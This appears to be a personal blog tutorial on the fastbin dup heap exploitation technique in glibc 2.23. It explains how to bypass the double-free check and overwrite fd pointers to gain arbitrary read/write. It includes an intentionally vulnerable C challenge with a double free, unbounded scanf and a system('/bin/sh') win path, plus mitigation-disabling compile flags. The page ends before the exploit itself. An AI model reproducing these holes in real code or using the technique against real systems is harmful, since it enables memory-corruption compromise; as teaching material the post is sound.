<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Fastbin Exploitation" />
<meta property="og:locale" content="en" />
<meta name="description" content="Explanation of the fastbin dup heap exploitation technique" />
<meta property="og:description" content="Explanation of the fastbin dup heap exploitation technique" />
<link rel="canonical" href="https://tibane0.github.io/post/Fastbin-dup/" />
<meta property="og:url" content="https://tibane0.github.io/post/Fastbin-dup/" />
<meta property="og:site_name" content="tibane" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-10-05T00:00:00+02:00" />
<meta property="og:image" content="https://tibane0.github.io/assets/images/me.jpeg" /><meta name="twitter:card" content="summary_large_image" />
      <meta property="twitter:image" content="https://tibane0.github.io/assets/images/me.jpeg" />
<meta property="twitter:title" content="Fastbin Exploitation" />
<meta name="twitter:site" content="@tibane101" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-10-19T13:12:43+02:00","datePublished":"2025-10-05T00:00:00+02:00","description":"Explanation of the fastbin dup heap exploitation technique","headline":"Fastbin Exploitation","mainEntityOfPage":{"@type":"WebPage","@id":"https://tibane0.github.io/post/Fastbin-dup/"},"url":"https://tibane0.github.io/post/Fastbin-dup/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Fastbin Exploitation | tibane
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="tibane">
<meta name="application-name" content="tibane">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/me.jpeg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">tibane</a>
    <p class="site-subtitle fst-italic mb-0">Exploring low-level development and the craft of pwning.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/projects/" class="nav-link">
            <i class="fa-fw fas fa-code"></i>
            

            <span>PROJECTS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/resume/" class="nav-link">
            <i class="fa-fw fas fa-id-card"></i>
            

            <span>RESUME</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/tibane0"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/tibane101"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['nkatekotibane101','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="https://www.linkedin.com/in/nkatekotibane"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Fastbin Exploitation</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Fastbin Exploitation</h1>
    
      <p class="post-desc fw-light mb-4">Explanation of the `fastbin dup` heap exploitation technique</p>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1759615200"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Oct  5, 2025
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760872363"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Oct 19, 2025
</time>

        </span>
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/tibane101">Nkateko Tibane</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2311 words"
>
  <em>12 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Fastbin Exploitation</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Fastbin Exploitation</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h1 id="fastbin-exploitation">Fastbin Exploitation</h1>

<h3 id="overview"><span class="me-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>This heap exploitation technique leverages a double free vulnerability to trick the allocator into returning the same chunk twice, without freeing it in between. This technique is used to corrupt a chunk’s metadata to link a fake chunk(target address) into a fastbin list.  This can be used to gain arbitrary read/write primitive.</p>
<h3 id="fastbin-review"><span class="me-2">Fastbin Review</span><a href="#fastbin-review" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>There are 10 fastbins which are maintained using a singly linked list. The linked list uses a Last In First Out (LIFO) manner. Each bin has chunks of the same size and the sizes are : 16, 24, 32, 40, 48, 56, 64, 72, 80 and 88. The sizes include metadata (<code class="language-plaintext highlighter-rouge">prev_size</code> and <code class="language-plaintext highlighter-rouge">size</code>). 
Consolidation does NOT happen with free fastbin size chunks.</p>
<h3 id="double-free-vulnerability"><span class="me-2">Double Free Vulnerability</span><a href="#double-free-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>A double free vulnerability occurs when a chunk of memory that was previously allocated is freed more than once. This is dangerous because it corrupts the allocato’s data structures.</p>

<h4 id="mitigation"><span class="me-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Fasttop</code> check: If the chunk being freed is at the top of the fastbin list <code class="language-plaintext highlighter-rouge">GLIBC</code> will throw an error (<code class="language-plaintext highlighter-rouge">double free or corruption (fasttop)</code>).</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">old</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"double free or corruption (fasttop)"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This is bypassed by freeing a different chunk in between the one that will be freed twice.</p>

<h3 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Exploiting Double Free in fastbins.</p>

<p>Fastbins are singly-linked lists used by the allocator to manage small, recently freed chunks efficiently. The progression of the fastbin list state during double free attack:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">a</code> is freed: <code class="language-plaintext highlighter-rouge">head -&gt; a -&gt; tail</code></li>
  <li><code class="language-plaintext highlighter-rouge">b</code> is freed: <code class="language-plaintext highlighter-rouge">head -&gt; b -&gt; a -&gt; tail</code> (used to bypass double free protection).</li>
  <li><code class="language-plaintext highlighter-rouge">a</code> is freed again : <code class="language-plaintext highlighter-rouge">head -&gt; a -&gt; b -&gt; a -&gt; tail</code>. (chunk pointer a is now duplicated)</li>
</ul>

<p>Because the chunk pointer for a has been duplicated in the free list, the heap allocater will hand out the same memory address multiple times when more chunks of the same size are allocated.</p>

<p>if subsequent allocations are requested, the allocator will hand out chunks like this:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">c = malloc(size)</code> returns chunk <code class="language-plaintext highlighter-rouge">a</code></li>
  <li><code class="language-plaintext highlighter-rouge">d = malloc(size)</code> returns chunk<code class="language-plaintext highlighter-rouge">b</code></li>
  <li><code class="language-plaintext highlighter-rouge">e = malloc(size)</code> returns chunk <code class="language-plaintext highlighter-rouge">a</code> again (same address as <code class="language-plaintext highlighter-rouge">c</code>)</li>
</ul>

<p>Since two pointers now point to the same exact location in memory, an attacker can manipulate the content of that memory through one pointer, while the allocator still manages the block via the other pointer.</p>

<h4 id="arbitrary-writeread"><span class="me-2">Arbitrary Write/Read</span><a href="#arbitrary-writeread" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>The goal of the fastbin dup technique is to achieve arbitrary read/write primitive, which is often achieved through fastbin corruption.</p>

<p>When a chunk is freed, its forward pointer (<code class="language-plaintext highlighter-rouge">fd</code>) points to the next free chunk in the list. By controlling a chunk that is in the fastbin list, you can overwrite the <code class="language-plaintext highlighter-rouge">fd</code> pointer to point to an arbitrary, controlled memory address.</p>

<p>When a new allocation of that size is made, the allocator will return the applied arbitrary 
memory address.</p>

<h5 id="example"><span class="me-2">Example</span><a href="#example" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>

<p>Vulnerable Application Code</p>

<p>This example is done on <code class="language-plaintext highlighter-rouge">glibc 2.23</code></p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>pwn@90782eb49a00:~/workspace<span class="nv">$ </span>/lib/x86_64-linux-gnu/libc.so.6 
GNU C Library <span class="o">(</span>Ubuntu GLIBC 2.23-0ubuntu11.3<span class="o">)</span> stable release version 2.23, by Roland McGrath et al.
Copyright <span class="o">(</span>C<span class="o">)</span> 2016 Free Software Foundation, Inc.
This is free software<span class="p">;</span> see the <span class="nb">source </span><span class="k">for </span>copying conditions.
There is NO warranty<span class="p">;</span> not even <span class="k">for </span>MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.4.0 20160609.
Available extensions:
	crypt add-on version 2.1 by Michael Glad and others
	GNU Libidn by Simon Josefsson
	Native POSIX Threads Library by Ulrich Drepper et al
	BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.

</pre></td></tr></tbody></table></code></div></div>

<p>In modern <code class="language-plaintext highlighter-rouge">glibc</code> you would need to fill in the <code class="language-plaintext highlighter-rouge">tcache</code> bins first.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="k">struct</span> <span class="n">target</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mh">0x8</span><span class="p">];</span>
        <span class="kt">char</span> <span class="n">target</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
<span class="p">}</span> <span class="n">targets</span><span class="p">;</span>

<span class="kt">char</span> <span class="o">*</span><span class="n">ptrs</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">allocate</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter size: "</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
        <span class="n">ptrs</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
        <span class="n">count</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">deallocate</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter Index: "</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
        <span class="n">free</span><span class="p">(</span><span class="n">ptrs</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">get_data</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter Index: "</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
        
        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter data: "</span><span class="p">);</span>
        <span class="c1">//fgets(ptrs[index], 64, stdin);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"1. malloc"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"2. free"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"3. scanf"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"4. check"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">check</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">targets</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="s">"admin"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"you win"</span><span class="p">);</span>
                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"you lose"</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

        <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"Target = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">targets</span><span class="p">.</span><span class="n">target</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter username: "</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span><span class="n">targets</span><span class="p">.</span><span class="n">username</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">menu</span><span class="p">();</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
                <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
                <span class="k">switch</span> <span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
                                <span class="n">allocate</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span> 
                                <span class="n">deallocate</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
                                <span class="n">get_data</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
                                <span class="n">check</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="nl">default:</span>
                                <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid Choice"</span><span class="p">);</span>
                <span class="p">}</span>       
        <span class="p">}</span>




        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<blockquote>
  <p>Compile <code class="language-plaintext highlighter-rouge">gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32</code></p>
</blockquote>

<p>The application has 4 main functions</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">allocate()</code>
    <ul>
      <li>get size from user and allocate a <code class="language-plaintext highlighter-rouge">malloc</code> a chunk of that size.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">deallocate()</code>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">free</code> a chunk</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">get_data()</code>
    <ul>
      <li>Enter data in a specific chunk</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">check()</code>
    <ul>
      <li>check if <code class="language-plaintext highlighter-rouge">targets.target = 'admin</code>. If it is it gives you a shell.
        <h6 id="exploitation-1">Exploitation</h6>
      </li>
    </ul>
  </li>
</ol>

